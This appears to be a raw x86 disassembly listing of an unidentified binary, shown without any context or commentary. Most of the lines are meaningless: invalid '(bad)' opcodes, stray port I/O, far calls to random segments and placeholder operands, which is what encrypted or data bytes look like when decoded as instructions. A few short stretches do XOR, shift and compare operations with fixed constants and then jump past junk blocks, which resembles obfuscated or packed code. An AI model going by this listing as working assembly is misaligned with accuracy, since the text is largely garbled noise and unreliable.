  407c7e:	int    0xc5
  407c80:	mov    ds:0x2bd861ba,eax
  407c85:	stos   BYTE PTR es:[edi],al
  407c86:	xchg   ecx,eax
  407c87:	dec    esi
  407c88:	sbb    eax,0xe3da20a3
  407c8d:	pop    es
  407c8e:	lds    ebx,FWORD PTR [esi+0x5f]
  407c91:	jp     0x407cf0
  407c93:	ss pop edx
  407c95:	cmp    BYTE PTR [edx-0x59371ab5],al
  407c9b:	xlat   BYTE PTR ds:[ebx]
  407c9c:	loopne 0x407c5d
  407c9e:	pop    eax
  407c9f:	shl    BYTE PTR [esi-0x4be73090],cl
  407ca5:	lock jae 0x407cee
  407ca8:	call   0x4ede:0xb689d413
  407caf:	addr16 jmp 0x347a:0xba291bec
  407cb7:	mov    edx,0xf50594bd
  407cbc:	les    edx,FWORD PTR [ebx]
  407cbe:	enter  0x1c7c,0x1
  407cc2:	jns    0x407c69
  407cc4:	sub    al,0x36
  407cc6:	fcom   DWORD PTR [ecx-0x40952afc]
  407ccc:	add    dh,ah
  407cce:	jns    0x407c89
  407cd0:	cmp    dl,BYTE PTR [ecx+0x55]
  407cd3:	(bad)  
  407cd4:	into   
  407cd5:	in     al,dx
  407cd6:	inc    esi
  407cd7:	outs   dx,BYTE PTR ds:[esi]
  407cd8:	retf   
  407cd9:	jl     0x407d53
  407cdb:	cld    
  407cdc:	sbb    ch,BYTE PTR [eax-0x8]
  407cdf:	stos   BYTE PTR es:[edi],al
  407ce0:	pop    ds
  407ce1:	or     ch,cl
  407ce3:	and    eax,ebp
  407ce5:	and    ebx,ebx
  407ce7:	pop    edx
  407ce8:	gs ins DWORD PTR es:[edi],dx
  407cea:	nop
  407ceb:	lock iret 
  407ced:	(bad)  
  407cee:	outs   dx,BYTE PTR ds:[esi]
  407cef:	xchg   edx,eax
  407cf0:	adc    dh,BYTE PTR [bp+0x1116]
  407cf5:	adc    WORD PTR [ebx+0xc],dx
  407cf9:	xchg   edx,eax
  407cfa:	enter  0xdb3a,0x3f
  407cfe:	ins    DWORD PTR es:[edi],dx
  407cff:	jecxz  0x407d79
  407d01:	push   cs
  407d02:	sub    al,0x1c
  407d04:	js     0x407cc1
  407d06:	mov    edi,0x12d22c7a
  407d0b:	inc    edx
  407d0c:	scas   al,BYTE PTR es:[edi]
  407d0d:	jg     0x407d4a
  407d0f:	adc    edx,DWORD PTR [eax-0x421c40d0]
  407d15:	mov    esp,0xcee33329
  407d1a:	jecxz  0x407d34
  407d1c:	add    dl,BYTE PTR [edx+eiz*1-0x554f04b4]
  407d23:	or     eax,0xf914754f
  407d28:	adc    DWORD PTR [ebx+0x10b2fa16],esi
  407d2e:	fdivr  QWORD PTR [ebx]
  407d30:	jo     0x407d9c
  407d32:	mov    eax,ds:0x500fab44
  407d37:	pusha  
  407d38:	fs mov dl,0xeb
  407d3b:	xchg   esi,eax
  407d3c:	or     ebx,DWORD PTR [eax-0x1b432b7]
  407d42:	int    0xec
  407d44:	leave  
  407d45:	dec    eax
  407d46:	rcl    eax,0x2d
  407d49:	inc    ebx
  407d4a:	(bad)  
  407d4c:	inc    esi
  407d4d:	mov    ebx,0x1c6909a9
  407d52:	(bad)  
  407d53:	das    
  407d54:	sub    BYTE PTR [edx-0x791e55fb],bl
  407d5a:	push   cs
  407d5b:	jecxz  0x407d18
  407d5d:	je     0x407d1c
  407d5f:	and    ecx,ebx
  407d61:	sti    
  407d62:	test   al,0x34
  407d64:	shl    eax,0xa1
  407d67:	cmp    dh,ch
  407d69:	mov    ebp,0x6e3faea1
  407d6e:	ret    
  407d6f:	and    ebp,eax
  407d71:	mov    gs,WORD PTR [ebx]
  407d73:	mov    edi,0xc86d8631
  407d78:	cmp    ch,BYTE PTR [edx+0x6b]
  407d7b:	sahf   
  407d7c:	jp     0x407d48
  407d7e:	and    eax,0xe57da9ca
  407d83:	mov    cl,0x9b
  407d85:	and    DWORD PTR [edx-0x27],0x94e42da0
  407d8c:	std    
  407d8d:	mov    bl,0xbd
  407d8f:	lea    edx,[edi]
  407d91:	pop    ss
  407d92:	mov    al,BYTE PTR [ebx-0x42e5d67e]
  407d98:	inc    ebp
  407d99:	jecxz  0x407da0
  407d9b:	push   esi
  407d9c:	jge    0x407d9d
  407d9e:	int    0x70
  407da0:	adc    eax,0x2dca3edd
  407da5:	neg    DWORD PTR [edx]
  407da7:	lods   eax,DWORD PTR ds:[esi]
  407da8:	out    0x4a,al
  407daa:	loope  0x407daa
  407dac:	sbb    al,0xb9
  407dae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407daf:	add    bl,BYTE PTR [ecx+0x51744230]
  407db5:	jecxz  0x407d47
  407db7:	iret   
  407db8:	cs setno dl
  407dbc:	pop    ss
  407dbd:	test   BYTE PTR [ebx+0x67],cl
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0x4f28b57e
  407e7d:	jle    0x407ea1
  407e7f:	outs   dx,DWORD PTR ds:[esi]
  407e80:	sbb    BYTE PTR [eax],bl
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [edi+0x1d],cl
  407e88:	div    edi
  407e8a:	jnp    0x407e96
  407e8c:	xor    ch,ch
  407e8e:	adc    DWORD PTR [ecx-0x1],esi
  407e91:	lahf   
  407e92:	nop
  407e93:	and    cl,BYTE PTR ds:0xc07bb62c
  407e99:	pop    eax
  407e9a:	jne    0x407ebb
  407e9c:	mov    cl,0x6
  407e9e:	sahf   
  407e9f:	(bad)  
  407ea0:	jnp    0x407e25
  407ea2:	push   edi
  407ea3:	push   esi
  407ea4:	jno    0x407e9e
  407ea6:	or     eax,0xcd0ad703
  407eab:	fist   DWORD PTR [ecx+0x6ac304a]
  407eb1:	bswap  esp
  407eb3:	xor    cl,BYTE PTR [ebx+0x1b]
  407eb6:	ins    DWORD PTR es:[edi],dx
  407eb7:	(bad)  [edx+0x48]
  407eba:	rol    BYTE PTR ds:0xc011813b,cl
  407ec0:	sbb    BYTE PTR [eax],0xb0
  407ec3:	mov    ?,ebx
  407ec5:	out    dx,eax
  407ec6:	xor    ebx,esp
  407ec8:	(bad)  
  407ec9:	ret    
  407eca:	push   cs
  407ecb:	inc    esi
  407ecc:	shl    DWORD PTR [ebp+0x44b4f164],cl
  407ed2:	inc    ecx
  407ed3:	jl     0x407e91
  407ed5:	xchg   BYTE PTR ds:0xcea8b10f,cl
  407edb:	sbb    bh,BYTE PTR ds:0xaaa135fe
  407ee1:	popa   
  407ee2:	fdiv   DWORD PTR [esi]
  407ee4:	not    DWORD PTR [edx]
  407ee6:	or     eax,0x7a3f53dc
  407eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eec:	call   0xd738ec0c
  407ef1:	ds xchg ch,bl
  407ef4:	pop    edx
  407ef5:	ja     0x407f4a
  407ef7:	inc    edx
  407ef8:	fldenv [ebx]
  407efa:	iret   
  407efb:	cs nop
  407efd:	in     al,dx
  407efe:	loopne 0x407f4d
  407f00:	xor    ebx,edx
  407f02:	mov    gs,WORD PTR [edx+0x6c]
  407f05:	adc    al,0xf8
  407f07:	push   edx
  407f08:	mov    eax,0x2d672a47
  407f0d:	mov    BYTE PTR [ebx+esi*2+0x7dc62d2b],dh
  407f14:	jp     0x407f50
  407f16:	mov    bh,0x4e
  407f18:	push   edx
  407f19:	and    eax,0x86b9df70
  407f1e:	pop    ecx
  407f1f:	out    dx,eax
  407f20:	xchg   esp,eax
  407f21:	fidiv  DWORD PTR [eax]
  407f23:	into   
  407f24:	inc    edi
  407f25:	mov    DWORD PTR [esp+edi*4+0x9],ebp
  407f29:	out    dx,al
  407f2a:	mov    al,bh
  407f2c:	fild   DWORD PTR [eax-0x6d64aaf7]
  407f32:	pop    ebx
  407f33:	imul   ecx,DWORD PTR [esi-0x41],0x1e
  407f37:	loop   0x407f90
  407f39:	fnsave [edx]
  407f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f3c:	xor    DWORD PTR [eax],edx
  407f3e:	or     BYTE PTR [ecx-0x40bbf105],dl
  407f44:	adc    eax,0xe16d6bd8
  407f49:	out    0xcb,al
  407f4b:	in     eax,dx
  407f4c:	sar    DWORD PTR [edx+0x2a5168c2],cl
  407f52:	outs   dx,DWORD PTR ds:[esi]
  407f53:	jae    0x407fa9
  407f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f56:	rcl    BYTE PTR [ebp+0x724ec9c6],cl
  407f5c:	jb     0x407fc9
  407f5e:	adc    dl,ah
  407f60:	sar    BYTE PTR [eax+0x21814566],1
  407f66:	cs test eax,0xdfd3ae2b
  407f6c:	jb     0x407fb4
  407f6e:	cmp    BYTE PTR [esi+ebx*1],bl
  407f71:	inc    edx
  407f72:	sub    eax,0xefa6c302
  407f77:	sbb    DWORD PTR [edx+0x25530db1],ebp
  407f7d:	in     eax,dx
  407f7e:	ss lahf 
  407f80:	call   0xac4a:0x2637366c
  407f87:	xor    DWORD PTR [edi-0x7e],esp
  407f8a:	out    0xfa,al
  407f8c:	or     ebp,DWORD PTR [edx+0x737d1a7e]
  407f92:	or     eax,0x771eb228
  407f97:	loopne 0x407f62
  407f99:	div    BYTE PTR [ebx-0x6a884309]
  407f9f:	repz add ebp,edi
  407fa2:	sub    DWORD PTR [ecx+0x2c566446],0x2c080619
  407fac:	(bad)  
  407fae:	cld    
  407faf:	xchg   edi,eax
  407fb0:	sub    al,0xcc
  407fb2:	add    ecx,ecx
  407fb4:	sub    al,BYTE PTR [edi]
  407fb6:	sbb    al,0x12
  407fb8:	(bad)  
  407fb9:	fnstenv [edx]
  407fbb:	retf   
  407fbc:	sbb    DWORD PTR cs:[esi+0x25],esi
  407fc0:	cli    
  407fc1:	pop    eax
  407fc2:	sahf   
  407fc3:	mov    cl,cl
  407fc5:	leave  
  407fc6:	xor    al,0x80
  407fc8:	mov    al,ds:0xfac11a1d
  407fcd:	push   ebx
  407fce:	xor    dh,BYTE PTR [ecx-0x10154078]
  407fd4:	sub    bl,BYTE PTR [edi+0x3c]
  407fd7:	pop    es
  407fd8:	pop    edi
  407fd9:	mov    bl,0x75
  407fdb:	pop    edx
  407fdc:	push   0x195ad7e5
  407fe1:	jg     0x407fd1
  407fe3:	daa    
  407fe4:	std    
  407fe5:	adc    edi,DWORD PTR [ebx-0xf]
  407fe8:	in     eax,dx
  407fe9:	addr16 push eax
  407feb:	retw   0x4a5e
  407fef:	push   eax
  407ff0:	xchg   esp,eax
  407ff1:	(bad)  
  407ff2:	xchg   ebp,eax
  407ff3:	imul   esi,esi,0x31811f86
  407ff9:	in     eax,0xff
  407ffb:	jle    0x40804b
  407ffd:	pop    esi
  407ffe:	ds xchg esi,eax
  408000:	xchg   ebp,ecx
  408002:	shr    DWORD PTR [edi-0x191cefa8],0xd4
  408009:	in     eax,dx
  40800a:	(bad)  
  40800c:	test   al,0x33
  40800e:	mov    ds:0x297fac3d,al
  408013:	out    dx,eax
  408014:	jge    0x408039
  408016:	daa    
  408017:	gs loop 0x408006
  40801a:	out    0x10,al
  40801c:	sub    al,dh
  40801e:	aaa    
  40801f:	mov    edi,0x9b4066a9
  408024:	call   FWORD PTR [eax+0x681788d3]
  40802a:	xchg   edi,eax
  40802b:	js     0x407fd2
  40802d:	aaa    
  40802e:	jns    0x40800f
  408030:	ja     0x408097
  408032:	fimul  DWORD PTR [ebx+edx*4-0x10]
  408036:	xchg   DWORD PTR [esi-0x67c9bd22],edi
  40803c:	xchg   BYTE PTR [esi],al
  40803e:	cdq    
  40803f:	ins    DWORD PTR es:[edi],dx
  408040:	dec    esi
  408041:	add    DWORD PTR [ecx+0x1a],edx
  408044:	xor    al,0x59
  408046:	adc    BYTE PTR [ecx+eax*8],dl
  408049:	xchg   ecx,eax
  40804a:	and    ch,0xf9
  40804d:	jg     0x408085
  40804f:	inc    esi
  408050:	jg     0x40805d
  408052:	sbb    BYTE PTR [ebp-0x2ce90dbe],dl
  408058:	mov    ds:0x75ea0e51,eax
  40805d:	div    BYTE PTR [esi-0x6b]
  408060:	xor    eax,DWORD PTR [edx+0x5171bf50]
  408066:	pop    esp
  408067:	jp     0x4080d6
  408069:	test   al,0xf7
  40806b:	nop
  40806c:	imul   edi,DWORD PTR [esi],0x5bc922e9
  408072:	mov    al,ds:0x801d55ad
  408077:	repz and BYTE PTR [ecx],dh
  40807a:	adc    al,0x2c
  40807c:	sub    eax,0x82d346c6
  408081:	cld    
  408082:	sub    dl,BYTE PTR [edi-0x945fcd3]
  408088:	push   ss
  408089:	adc    al,0xf3
  40808b:	mov    bh,0xb0
  40808d:	out    dx,al
  40808e:	repnz imul ebx,DWORD PTR [eax],0xa4c04aa7
  408095:	sbb    eax,0xae0de95f
  40809a:	sbb    esp,DWORD PTR [esi-0x68]
  40809d:	popf   
  40809e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40809f:	or     BYTE PTR [ebx-0x51515a98],bh
  4080a5:	call   0xefaa0b7a
  4080aa:	imul   esi,DWORD PTR [edi-0x6914b270],0x6e
  4080b1:	les    esp,FWORD PTR [edi+0x14]
  4080b4:	inc    edi
  4080b5:	lods   al,BYTE PTR ds:[esi]
  4080b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080b7:	mov    ebp,?
  4080b9:	xor    BYTE PTR [edx-0x5a],bh
  4080bc:	xor    eax,0xf65859b2
  4080c1:	(bad)  
  4080c2:	cmp    ah,BYTE PTR [edx+0x1c]
  4080c5:	xor    ebx,esp
  4080c7:	or     eax,0x391ff1d8
  4080cc:	mov    ecx,0x9189c330
  4080d1:	xchg   ebx,eax
  4080d2:	(bad)  
  4080d3:	sti    
  4080d4:	leave  
  4080d5:	(bad)  
  4080d6:	imul   BYTE PTR [eax+0x4d]
  4080d9:	mov    ecx,0xdd5fbaf8
  4080de:	mov    cl,0x2b
  4080e0:	out    0xab,eax
  4080e2:	jecxz  0x408103
  4080e4:	sahf   
  4080e5:	add    al,0x9b
  4080e7:	nop
  4080e8:	jne    0x40806c
  4080ea:	fidiv  DWORD PTR [esi-0x3caf8c6c]
  4080f0:	dec    ebx
  4080f1:	and    BYTE PTR [eax+0x11d27159],ch
  4080f7:	mov    dl,0xb0
  4080f9:	js     0x4080cb
  4080fb:	aas    
  4080fc:	lahf   
  4080fd:	push   edx
  4080fe:	inc    edi
  4080ff:	aam    0xfe
  408101:	shl    DWORD PTR [ebx],cl
  408103:	call   0x20b8:0xba6f198e
  40810a:	add    eax,0x52b724c3
  40810f:	and    esp,edi
  408111:	loop   0x4080d5
  408113:	cld    
  408114:	arpl   WORD PTR ds:0xa70e9d49,cx
  40811a:	push   ds
  40811b:	fimul  DWORD PTR [ecx+edx*2-0x73]
  40811f:	inc    esi
  408120:	sar    DWORD PTR [esi],0xed
  408123:	sbb    eax,0xab86466e
  408128:	jle    0x4080fa
  40812a:	aas    
  40812b:	daa    
  40812c:	cmp    eax,0xa6552569
  408131:	das    
  408132:	aaa    
  408133:	add    al,0x5a
  408135:	leave  
  408136:	loope  0x40817d
  408138:	xchg   DWORD PTR [eax+0x611e4732],edx
  40813e:	and    ah,BYTE PTR [ecx-0x7d42842c]
  408144:	bnd jns 0x40810f
  408147:	imul   edi,eax,0x286c62c3
  40814d:	(bad)  
  40814e:	cdq    
  40814f:	outs   dx,BYTE PTR ds:[esi]
  408150:	and    bl,BYTE PTR [edi]
  408152:	enter  0x4101,0x15
  408156:	and    DWORD PTR [eax-0x13],esp
  408159:	(bad)  
  40815b:	mov    WORD PTR [ebp-0x5f],ss
  40815e:	jp     0x4081cd
  408160:	mov    dh,0xde
  408162:	xchg   edi,eax
  408163:	or     dl,cl
  408165:	adc    DWORD PTR [ebp+edi*1-0x73bb6071],edi
  40816c:	sub    dl,BYTE PTR [eax]
  40816e:	pop    ebx
  40816f:	xor    cl,BYTE PTR [edi+0x22]
  408172:	ss inc eax
  408174:	xchg   ebp,eax
  408175:	out    0x23,al
  408177:	mov    eax,0x46c5a062
  40817c:	push   ebp
  40817d:	pop    esp
  40817e:	jp     0x4081d5
  408180:	add    BYTE PTR [ebp+0x536a31e8],0xb5
  408187:	xchg   esp,eax
  408188:	call   0x57c6:0xbf829928
  40818f:	inc    edi
  408190:	jmp    0x324e61e4
  408195:	fiadd  WORD PTR [edx-0x49]
  408198:	cmp    edi,DWORD PTR [edx+edi*4-0xe]
  40819c:	imul   ecx,DWORD PTR [edi],0xc86614a4
  4081a2:	and    DWORD PTR [edx-0x12],ecx
  4081a5:	test   al,0x62
  4081a7:	cmp    BYTE PTR [esi-0x78],al
  4081aa:	in     al,0x88
  4081ac:	frstor [ebp-0x5d]
  4081af:	jmp    0x96c4:0x3b9e8811
  4081b6:	pushf  
  4081b7:	jg     0x4081cd
  4081b9:	add    ebx,DWORD PTR [eax+0x18]
  4081bc:	repnz xor BYTE PTR [ebp+0x142dcc4b],cl
  4081c3:	mov    eax,0xa964df9c
  4081c8:	les    edx,FWORD PTR [ebx-0x5db7ce78]
  4081ce:	shl    BYTE PTR [edi+eiz*2-0x3d8c22cc],1
  4081d5:	pop    esp
  4081d6:	popa   
  4081d7:	out    dx,eax
  4081d8:	aad    0xd4
  4081da:	add    bl,cl
  4081dc:	xchg   ebp,eax
  4081dd:	mov    eax,ds:0x6b365334
  4081e2:	mov    esp,ebx
  4081e4:	fwait
  4081e5:	(bad)  
  4081e6:	js     0x408228
  4081e8:	test   DWORD PTR [ebp+0x63],ecx
  4081eb:	ror    BYTE PTR [ecx+0x22b1b2ab],1
  4081f1:	inc    ebx
  4081f2:	out    dx,al
  4081f3:	cmp    eax,0x7a5d5a31
  4081f8:	dec    eax
  4081f9:	popf   
  4081fa:	stos   DWORD PTR es:[edi],eax
  4081fb:	mov    ds:0x8f52f04,eax
  408200:	sbb    cl,al
  408202:	xchg   edi,eax
  408203:	jg     0x4081d7
  408205:	mov    ebx,0x138dba4a
  40820a:	addr16 inc ebp
  40820c:	jmp    0x40821d
  40820e:	fsub   DWORD PTR [esi+ecx*1+0x5627e55]
  408215:	push   ds
  408216:	xchg   edi,eax
  408217:	mov    dl,0xf2
  408219:	dec    esp
  40821a:	xchg   esp,eax
  40821b:	xor    al,0xcb
  40821d:	jge    0x4081b0
  40821f:	(bad)  
  408220:	in     al,0x90
  408222:	pushf  
  408223:	pop    edx
  408224:	push   0xffffff89
  408226:	sbb    al,0xd5
  408228:	mov    al,0x62
  40822a:	push   edx
  40822b:	scas   al,BYTE PTR es:[edi]
  40822c:	sbb    DWORD PTR [ebx-0x379f22c3],eax
  408232:	fcom   QWORD PTR [edx]
  408234:	or     DWORD PTR [ebp+0x6c],0x60e0971a
  40823b:	inc    eax
  40823c:	ja     0x408274
  40823e:	or     DWORD PTR [edx+0x57],ecx
  408241:	adc    eax,0x546a6210
  408246:	popf   
  408247:	mov    DWORD PTR [ebp-0x6c],eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0x37ce709d
  40828a:	hlt    
  40828b:	push   0xffffffa8
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [edi+0x7c287b69],ah
  408299:	pop    eax
  40829a:	cld    
  40829b:	jmp    0x40826c
  40829d:	shl    cl,cl
  40829f:	or     BYTE PTR [edx-0x54],cl
  4082a2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082a4:	mov    al,0x4f
  4082a6:	cmp    edx,DWORD PTR [ecx]
  4082a8:	pop    ebp
  4082a9:	repz dec esi
  4082ab:	mov    ch,0x2f
  4082ad:	sub    BYTE PTR [esi-0x941596f],ch
  4082b3:	push   ebp
  4082b4:	push   edx
  4082b5:	xchg   ebx,eax
  4082b6:	fiadd  DWORD PTR [ebp-0x42]
  4082b9:	mov    eax,ds:0x15dec321
  4082be:	scas   eax,DWORD PTR es:[edi]
  4082bf:	scas   al,BYTE PTR es:[edi]
  4082c0:	jmp    0xd482:0x2d561506
  4082c7:	and    eax,0x8d45bcd4
  4082cc:	std    
  4082cd:	lods   eax,DWORD PTR ds:[esi]
  4082ce:	fmul   QWORD PTR [edx-0x79]
  4082d1:	cmp    eax,0xdb9bb081
  4082d6:	rol    al,1
  4082d8:	cld    
  4082d9:	push   ss
  4082da:	ins    DWORD PTR es:[edi],dx
  4082db:	cmp    edi,DWORD PTR [eax-0x9]
  4082de:	nop
  4082df:	push   edi
  4082e0:	xor    al,0xd1
  4082e2:	pop    edx
  4082e3:	inc    edx
  4082e4:	dec    esi
  4082e5:	adc    eax,0x24aecd6e
  4082ea:	leave  
  4082eb:	dec    ebx
  4082ec:	push   ebx
  4082ed:	frstor [esi]
  4082ef:	popa   
  4082f0:	xchg   ebx,eax
  4082f1:	cmp    al,0xed
  4082f3:	push   si
  4082f5:	aas    
  4082f6:	sbb    cl,BYTE PTR ds:0xeb343c26
  4082fc:	popf   
  4082fd:	inc    esi
  4082fe:	mov    bl,0xf3
  408300:	push   ebp
  408301:	pop    ebx
  408302:	mov    ecx,0xf4c6d782
  408307:	xchg   esp,eax
  408308:	pusha  
  408309:	mov    dl,0x4a
  40830b:	adc    ah,dh
  40830d:	cli    
  40830e:	pop    ebp
  40830f:	fnstenv [ebx-0x60]
  408312:	xlat   BYTE PTR ds:[ebx]
  408313:	mov    ecx,0x4c3ea69b
  408318:	not    BYTE PTR [esi+0x43]
  40831b:	test   al,0x42
  40831d:	dec    ebp
  40831e:	dec    ebx
  40831f:	mov    ds:0x345b9e84,eax
  408324:	fild   WORD PTR [esi-0x14]
  408327:	add    ecx,DWORD PTR [edx+ebp*2]
  40832a:	lahf   
  40832b:	(bad)  
  40832c:	xor    DWORD PTR [edx],edi
  40832e:	xchg   esi,eax
  40832f:	pop    esi
  408330:	dec    eax
  408331:	push   edx
  408332:	repz push edx
  408334:	mul    esp
  408336:	cld    
  408337:	push   eax
  408338:	sbb    al,0xbb
  40833a:	push   0xffffffe5
  40833c:	fsub   QWORD PTR [esi-0x10]
  40833f:	push   eax
  408340:	xor    eax,0x90feee41
  408345:	xchg   esi,eax
  408346:	xor    edi,ebp
  408348:	xchg   BYTE PTR [eax-0x4cbe51fc],ch
  40834e:	add    DWORD PTR [esi+0x5e040572],edi
  408354:	retf   0xcba5
  408357:	xchg   edi,eax
  408358:	cwde   
  408359:	and    eax,0x710717ba
  40835e:	inc    ecx
  40835f:	pop    ecx
  408360:	sub    DWORD PTR [esi],0x68
  408363:	add    eax,0xc34b2495
  408368:	dec    esi
  408369:	(bad)  
  40836a:	sti    
  40836b:	mov    esp,0xfa40b41e
  408370:	icebp  
  408371:	(bad)  [ebx+0x68]
  408374:	(bad)  
  408375:	popf   
  408376:	xchg   edx,eax
  408377:	push   ds
  408378:	add    cl,BYTE PTR [eax+0x7fa344a9]
  40837e:	lods   eax,DWORD PTR ds:[esi]
  40837f:	cmp    al,0xf8
  408381:	dec    eax
  408382:	das    
  408383:	aas    
  408384:	mov    eax,0x3d5e382d
  408389:	add    al,BYTE PTR [esi-0x3a]
  40838c:	sub    al,0x5c
  40838e:	sub    DWORD PTR [edx+0x3c],esp
  408391:	adc    al,0x19
  408393:	mov    edx,0x80cc8abc
  408398:	inc    edi
  408399:	or     ch,BYTE PTR [ebx+0x6b1d35a5]
  40839f:	and    edx,DWORD PTR [ecx]
  4083a1:	ror    dl,0xce
  4083a4:	cmp    DWORD PTR [edi+0x37],edi
  4083a7:	les    ebx,FWORD PTR [edx+eax*4]
  4083aa:	jl     0x408407
  4083ac:	popf   
  4083ad:	mov    ds:0x82489278,eax
  4083b2:	das    
  4083b3:	popa   
  4083b4:	jp     0x408378
  4083b6:	nop
  4083b7:	int    0xbf
  4083b9:	xchg   ebx,eax
  4083ba:	sbb    al,al
  4083bc:	sbb    eax,DWORD PTR [ecx*4-0x303547b0]
  4083c3:	and    BYTE PTR [ebp+0x5],cl
  4083c6:	nop
  4083c7:	jg     0x408409
  4083c9:	sbb    dl,BYTE PTR [edi-0x5a]
  4083cc:	arpl   si,sp
  4083ce:	xchg   ecx,eax
  4083cf:	push   edx
  4083d0:	sti    
  4083d1:	outs   dx,DWORD PTR ds:[esi]
  4083d2:	fcmovnbe st,st(0)
  4083d4:	dec    esp
  4083d5:	xor    cl,BYTE PTR [edx]
  4083d7:	adc    BYTE PTR [edi-0x57],bh
  4083da:	cmp    dl,BYTE PTR ds:0xd58950ce
  4083e0:	sub    al,0x5b
  4083e2:	push   edi
  4083e3:	jb     0x40840d
  4083e5:	sub    al,0x5
  4083e7:	and    dl,BYTE PTR [edi]
  4083e9:	mov    ch,0x3b
  4083eb:	mov    es,edi
  4083ed:	xor    edi,edx
  4083ef:	(bad)  
  4083f0:	fmul   st,st(1)
  4083f2:	add    BYTE PTR [ebp+esi*8+0x9],ch
  4083f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083f7:	cdq    
  4083f8:	imul   edx,esi,0x3f37e4cf
  4083fe:	hlt    
  4083ff:	dec    ebx
  408400:	pusha  
  408401:	add    eax,0xfb9b724
  408406:	imul   eax,DWORD PTR [ebp+eiz*1-0x476c0e47],0xfffffff9
  40840e:	inc    edi
  40840f:	pop    ebx
  408410:	jmp    0x6b74e5fc
  408415:	or     BYTE PTR [ebx-0x29],bh
  408418:	daa    
  408419:	mov    esi,0x7b31a964
  40841e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40841f:	jo     0x40840b
  408421:	daa    
  408422:	sbb    BYTE PTR [eax-0x7d],bh
  408425:	fwait
  408426:	mov    ds:0x269aba55,al
  40842b:	inc    esp
  40842c:	xor    ebx,ecx
  40842e:	adc    DWORD PTR [eax+0x1d],0xffffffee
  408432:	xor    cl,ah
  408434:	mov    dh,0x42
  408436:	xlat   BYTE PTR ds:[ebx]
  408437:	xchg   ecx,eax
  408438:	sar    BYTE PTR [edx+edx*1-0x3d],cl
  40843c:	add    eax,0x5f340b56
  408441:	jecxz  0x4083c4
  408443:	jecxz  0x408475
  408445:	data16 cmp bh,0x7c
  408449:	call   0x1129:0xe9be8caf
  408450:	cmp    ecx,esi
  408452:	sub    DWORD PTR [edi-0x74f91ca6],ecx
  408458:	mov    bl,0x4a
  40845a:	(bad)  
  40845b:	enter  0x66f,0x3f
  40845f:	enter  0x525d,0x86
  408463:	ret    0xb004
  408466:	call   0x33a0504a
  40846b:	ret    
